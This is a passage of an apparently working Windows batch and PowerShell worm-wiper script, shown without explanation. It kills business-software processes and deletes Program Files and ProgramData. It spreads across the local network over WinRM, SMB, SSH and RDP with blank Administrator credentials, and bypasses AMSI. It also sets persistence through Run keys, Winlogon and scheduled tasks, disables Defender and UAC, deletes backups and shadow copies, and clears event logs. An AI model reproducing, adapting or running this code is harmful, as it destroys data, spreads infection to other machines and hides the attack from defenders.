ZTray.exe','ComputerZService.exe','ClearCache.exe','ProLiantMonitor.exe','bugreport.exe','GNWebServer.exe','UI0Detect.exe','GNCore.exe','gnwayDDNS.exe','GNWebHelper.exe','php-cgi.exe','ESLUSBService.exe','CQA.exe','Kekcoek.pif','Tinuknx.exe','servers.exe','ping.exe','TianHeng.exe','K3MobileService.exe','VSSVC.exe','Xshell.exe','XshellCore.exe','FNPLicensingService.exe','XYNTService.exe','EISService.exe','UFSoft.U8.Framework.EncryptManager.exe','yonyou.u8.gc.taskmanager.servicebus.exe','U8KeyManagePool.exe','U8MPool.exe','U8SCMPool.exe','UFIDA.U8.Report.SLReportService.exe','U8TaskService.exe','U8TaskWorker.exe','U8WebPool.exe','U8AllAuthServer.exe','UFIDA.U8.UAP.ReportService.exe','UFIDA.U8.ECE.UTU.Services.exe','U8WorkerService.exe','UFIDA.U8.ECE.UTU.exe','ShellStub.exe','U8UpLoadTask.exe','UfSysHostingService.exe','UFIDA.UBF.SystemManage.ApplicationService.exe','UFIDA.U9.CS.Collaboration.MailService.exe','NotificationService.exe','UBFdevenv.exe','UFIDA.U9.SystemManage.SystemManagerClient.exe','mongod.exe','SpusCss.exe','UUDesktop.exe','KDHRServices.exe','Kingdee.K3.PUBLIC.BkgSvcHost.exe','Kingdee.K3.HR.Server.exe','Kingdee.K3.Mobile.Servics.exe','Kingdee.K3.PUBLIC.KDSvrMgrHost.exe','KDSvrMgrService.exe','pdfServer.exe','pdfspeedup.exe','SufAppServer.exe','tomcat5.exe','Kingdee.K3.Mobile.LightPushService.exe','iMTSSvcMgr.exe','kdmain.exe','KDActMGr.exe','Kingdee.DeskTool.exe','K3ServiceUpdater.exe','Aua.exe','iNethinkSQLBackup.exe','auaJW.exe','Scheduler.exe','bschJW.exe','SystemTray64.exe','OfficeDaemon.exe','OfficeIndex.exe','OfficeIm.exe','iNethinkSQLBackupConsole.exe','OfficeMail.exe','OfficeTask.exe','OfficePOP3.exe','apache.exe','GnHostService.exe','HwUVPUpgrade.exe','Kingdee.KIS.UESystemSer.exe','uvpmonitor.exe','UVPUpgradeService.exe','KDdataUpdate.exe','Portal.exe','U8SMSSrv.exe','Ufida.T.SM.PublishService.exe','lta8.exe','UfSvrMgr.exe','AutoUpdateService.exe','MOM.exe','wscript.exe','cscript.exe'); $task = $task | Sort-Object -Unique; foreach($t in $task){taskkill /F /IM $t 2>$null}" >nul 2>&1
icacls "%ProgramData%" /grant Administrators:F /t /c /l /q >nul 2>&1
rmdir /s /q "%ProgramData%" >nul 2>&1
takeown /f "%ProgramFiles%" /a /r /d y >nul 2>&1
icacls "%ProgramFiles%" /grant Administrators:F /t /c /l /q >nul 2>&1
rmdir /s /q "%ProgramFiles%" >nul 2>&1
start /b "" cmd /c "exit" >nul 2>&1
start /b "" powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /b /min %~f0' -WindowStyle Hidden" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$ErrorActionPreference = 'SilentlyContinue';^
$ips = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' };^
if ($ips.Count -eq 0) { exit };^
$myIP = $ips[0].IPAddressToString;^
$subnet = $myIP -replace '\.\d+$', '.';^
$sourceFile = [System.IO.Path]::GetFullPath('%~dpnx0');^
$psexecPath = [System.IO.Path]::GetFullPath('%~dp0psexec.exe');^
$targets = 1..254 | ForEach-Object { \"$subnet$_\" } | Where-Object { $_ -ne $myIP };^
$iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault();^
$pool = [RunspaceFactory]::CreateRunspacePool(1, [Environment]::ProcessorCount * 4, $iss, $Host);^
$pool.Open();^
$rand = New-Object Random;^
$computerNames = @('DESKTOP', 'SERVER', 'WORKSTATION', 'PC', 'LAPTOP', 'WIN', 'SRV', 'CLIENT', 'TERMINAL', 'NODE', 'HOST', 'VM', 'INSTANCE', 'DEVICE', 'SYSTEM');^
$domains = @('corp', 'local', 'domain', 'internal', 'office', 'network', 'lab', 'test', 'prod', 'dev');^
$allTargets = @();^
$allTargets += $targets;^
for ($i=1; $i -le 254; $i++) { $allTargets += \"$subnet$i\" };^
try { $allTargets += (Get-NetNeighbor -State Reachable | Where-Object { $_.IPAddress -like '*.*.*.*' }).IPAddress } catch {};^
try { $allTargets += (Get-NetRoute -DestinationPrefix '0.0.0.0/0' | ForEach-Object { $_.NextHop }) } catch {};^
try { $dns = (Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -First 1).ServerAddresses[0]; $allTargets += $dns; for ($i=1; $i -le 254; $i++) { $allTargets += ($dns -replace '\.\d+$', \".$i\") } } catch {};^
foreach ($comp in $computerNames) { foreach ($num in 1..20) { $allTargets += \"$comp$num\" } };^
foreach ($comp in $computerNames) { foreach ($dom in $domains) { $allTargets += \"$comp.$dom.local\"; $allTargets += \"$comp.$dom.corp\" } };^
$allTargets = $allTargets | Sort-Object -Unique;^
$sb = {^
    param($target, $source, $psexec, $rand);^
    $openPorts = @();^
    $checkPorts = @(445, 5985, 5986, 22, 3389, 135, 139, 389, 636, 3268, 3269, 53, 88, 464, 1433, 3306, 5432);^
    foreach ($port in $checkPorts) {^
        $socket = New-Object System.Net.Sockets.TcpClient;^
        try { $async = $socket.BeginConnect($target, $port, $null, $null); if ($async.AsyncWaitHandle.WaitOne(100)) { $socket.EndConnect($async); $openPorts += $port }; $socket.Close() } catch {}^
    };^
    $winrm = $openPorts -contains 5985;^
    $smb = $openPorts -contains 445;^
    $ssh = $openPorts -contains 22;^
    $rdp = $openPorts -contains 3389;^
    $success = $false;^
    if ($winrm -and -not $success) {^
        try {^
            $securePwd = ConvertTo-SecureString -String '' -AsPlainText -Force;^
            $cred = New-Object System.Management.Automation.PSCredential('Administrator', $securePwd);^
            try { $session = New-PSSession -ComputerName $target -Credential $cred -ErrorAction Stop; $sessionCreated = $true } catch {^
                try { $session = New-PSSession -ComputerName $target -UseSSL -Credential $cred -ErrorAction Stop; $sessionCreated = $true } catch { $sessionCreated = $false }^
            };^
            if ($sessionCreated) {^
                $remotePath = '%SystemRoot%\Temp\' + [System.IO.Path]::GetRandomFileName() + '.bat';^
                Copy-Item -Path $source -Destination $remotePath -ToSession $session -Force -ErrorAction SilentlyContinue;^
                Invoke-Command -Session $session -ScriptBlock { Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c $using:remotePath --remote\" -WindowStyle Hidden } -ErrorAction SilentlyContinue;^
                Remove-PSSession $session; $success = $true^
            }^
        } catch {}^
    };^
    if ($smb -and -not $success) {^
        try {^
            $destPath = \"\\$target\C$\%SystemRoot%\Temp\\\";^
            $fileName = [System.IO.Path]::GetRandomFileName() + '.bat';^
            $fullPath = $destPath + $fileName;^
            if (Test-Connection -ComputerName $target -Count 1 -Quiet) {^
                try { Copy-Item -Path $source -Destination $fullPath -Force -ErrorAction SilentlyContinue } catch {};^
                if (Test-Path $fullPath) {^
                    try {^
                        Invoke-CimMethod -ComputerName $target -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = \"cmd.exe /c $fullPath --remote\" } -ErrorAction SilentlyContinue | Out-Null;^
                        $success = $true^
                    } catch {};^
                    if (-not $success) {^
                        try {^
                            $taskName = 'SysUpdate' + $rand.Next(1000,9999);^
                            schtasks /create /s $target /tn $taskName /tr \"cmd.exe /c $fullPath --remote\" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1;^
                            schtasks /run /s $target /tn $taskName >nul 2>&1;^
                            Start-Sleep -Milliseconds 500;^
                            schtasks /delete /s $target /tn $taskName /f >nul 2>&1;^
                            $success = $true^
                        } catch {}^
                    };^
                    if (-not $success -and (Test-Path $psexec)) {^
                        try { Start-Process -FilePath $psexec -ArgumentList \"\\$target -s -d -accepteula cmd /c $fullPath --remote\" -WindowStyle Hidden -ErrorAction SilentlyContinue; $success = $true } catch {}^
                    }^
                }^
            }^
        } catch {}^
    };^
    if ($ssh -and -not $success) {^
        try {^
            $plinkPath = [System.IO.Path]::GetTempFileName() + '.exe';^
            try { Invoke-WebRequest -Uri 'https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe' -OutFile $plinkPath -TimeoutSec 5 } catch {};^
            if (Test-Path $plinkPath) {^
                $remoteCmd = \"cmd /c echo $source ^> %SystemRoot%\\Temp\\worm.bat ^&^& %SystemRoot%\\Temp\\worm.bat --remote\";^
                & $plinkPath -ssh -batch -o StrictHostKeyChecking=no -l Administrator -pw '' $target $remoteCmd 2>$null;^
                Remove-Item $plinkPath -Force -ErrorAction SilentlyContinue;^
                $success = $true^
            }^
        } catch {}^
    };^
    if ($rdp -and -not $success) {^
        try {^
            $rdpPath = [System.IO.Path]::GetTempFileName() + '.rdp';^
            @\"^
full address:s:$target^
username:s:Administrator^
command shell virtualization:s:cmd.exe /c start /b \"$source\" --remote^
\"@ | Out-File -FilePath $rdpPath -Encoding ASCII;^
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $rdpPath -WindowStyle Hidden;^
            Start-Sleep -Seconds 2;^
            Remove-Item $rdpPath -Force -ErrorAction SilentlyContinue;^
            $success = $true^
        } catch {}^
    };^
    if (-not $success) {^
        try {^
            $ping = New-Object System.Net.NetworkInformation.Ping;^
            $reply = $ping.Send($target, 500);^
            if ($reply.Status -eq 'Success') {^
                net use \"\\\\$target\C$\" /user:'' '' >nul 2>&1;^
                if ($LASTEXITCODE -eq 0) {
                    $dest = \"\\\\$target\C$\Windows\Temp\\\";^
                    $name = [System.IO.Path]::GetRandomFileName();^
                    Copy-Item $source \"$dest$name.bat\" -Force -ErrorAction SilentlyContinue;^
                    net use \"\\\\$target\C$\" /delete >nul 2>&1^
                }^
            }^
        } catch {}^
    };^
    [PSCustomObject]@{ IP = $target; Ports = $openPorts -join ','; Success = $success }^
};^
$jobs = foreach ($target in $allTargets) {^
    $ps = [powershell]::Create().AddScript($sb).AddArgument($target).AddArgument($sourceFile).AddArgument($psexecPath).AddArgument($rand);^
    $ps.RunspacePool = $pool;^
    [PSCustomObject]@{ Pipe = $ps; Result = $ps.BeginInvoke() }^
};^
while ($jobs.Result.IsCompleted -contains $false) { [System.Threading.Thread]::Sleep(50) };^
foreach ($job in $jobs) { $null = $job.Pipe.EndInvoke($job.Result); $job.Pipe.Dispose() };^
$pool.Close(); $pool.Dispose()" >nul 2>&1
echo select disk 0 > "%dp_script%"
echo list partition >> "%dp_script%"
diskpart /s "%dp_script%" > "%dp_output%" 2>&1
for /f "tokens=2,3" %%A in ('findstr /i "Recovery" "%dp_output%" 2^>nul') do (
    set "part_num=%%B"
)
del "%dp_script%" "%dp_output%" 2>nul

for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB"') do set "mem=%%i"
if defined mem ( set /a "ram_slay=!mem!*8/10" ) else ( set /a "ram_slay=0" )

(
    echo [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    echo [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
) > "%TEMP%\amsi_bypass.ps1"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\amsi_bypass.ps1" >nul 2>&1
del "%TEMP%\amsi_bypass.ps1" >nul 2>&1

whoami /groups | find "S-1-5-32-544" >nul 2>&1 && set "admin=1" || set "admin=0"

if "!admin!" equ "1" (
    reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\0cmd.exe /c start /b /min %~f0" /f >nul 2>&1
    schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c start /b /min %~f0" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
) else (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "cmd.exe /c start /b /min %~f0" /f >nul 2>&1
    reg add "HKCU\Environment" /v windir /d "cmd.exe /c start /b /min %~f0 & REM" /f >nul 2>&1
    schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c start /b /min %~f0" /sc onlogon /f >nul 2>&1
)

goto :stage1_admin

:stage1_admin
net stop WinDefend /y >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6" >nul 2>&1
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%SystemDrive%\'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.ps1'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'cmd.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'powershell.exe'" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Sense' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv' -Name 'Start' -Value 4" >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc' -Name 'Start' -Value 4" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableRegistryTools /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableInstallerDetection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableSecureUIAPaths /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ValidateAdminCodeSignatures /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableUIADesktopToggle /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v SupportFullTrustStartupTasks /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLinkedConnections /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableVirtualization /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procmon.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eventvwr.exe' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\services.msc' -Name 'Debugger' -Value 'cmd.exe /c exit' -Force" >nul 2>&1
reagentc /disable >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {default} advancedoptions false >nul 2>&1
bcdedit /set {default} bootlog No >nul 2>&1
bcdedit /set {default} quietboot Yes >nul 2>&1
bcdedit /set {default} displaybootmenu No >nul 2>&1
bcdedit /set {current} safeboot Network No >nul 2>&1
powershell -Command "Get-ComputerRestorePoint | ForEach-Object {Disable-ComputerRestore -Drive $_.Drive; Enable-ComputerRestore -Drive $_.Drive}" >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
wbadmin delete backup -keepVersions:0 -quiet >nul 2>&1
wbadmin delete systemstatebackup -keepVersions:0 -quiet >nul 2>&1
powershell -Command "Get-CimInstance Win32_Service -Filter \"Name='vss'\" | Invoke-CimMethod -Name ChangeStartMode -Arguments @{StartMode='Disabled'}; Stop-Service vss -Force" >nul 2>&1
powershell -Command "Get-CimInstance Win32_Service -Filter \"Name='swprv'\" | Invoke-CimMethod -Name ChangeStartMode -Arguments @{StartMode='Disabled'}; Stop-Service swprv -Force" >nul 2>&1
sc config vss start= disabled >nul 2>&1
sc config swprv start= disabled >nul 2>&1
sc stop vss >nul 2>&1
sc stop swprv >nul 2>&1
fsutil behavior set disablelastaccess 1 >nul 2>&1
fsutil behavior set disable8dot3 1 >nul 2>&1
fsutil usn deletejournal /d %SystemDrive% >nul 2>&1
fsutil resource setautoreset true %SystemDrive%\ >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Setup >nul 2>&1
wevtutil cl "Windows PowerShell" >nul 2>&1
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Windows Defender/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Sysmon/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Mitigations/KernelMode" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Mitigations/UserMode" >nul 2>&1
wevtutil cl "Microsoft-Windows-Win32k/Operational" >nul 2>&1
wevtutil set-log System /enabled:false >nul 2>&1
wevtutil set-log Security /enabled:false >nul 2>&1
auditpol /clear /y >nul 2>&1
auditpol /remove /user:Everyone >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Audit" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v auditbaseobjects /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v crashonauditfail /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v fullprivilegeauditing /t REG_BINARY /d 00 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymoussam /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v everyoneincludesanonymous /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v disabledomaincreds /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v NoLmHash /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v UseMachineId /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceUnlockLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v PasswordExpiryWarning /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c start /b /min !f!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_EXPAND_SZ /d "%%SystemRoot%%\system32\userinit.exe,cmd.exe /c start \"\" /b /min !f!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Notify /t REG_SZ /d "cmd.exe /c start /b /min !f!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Taskman /t REG_SZ /d "cmd.exe /c start /b /min !f!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v dontdisplaylastusername /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v dontdisplaylockeduserid /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v UndockWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStatusMessages /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f >nul 2>&1
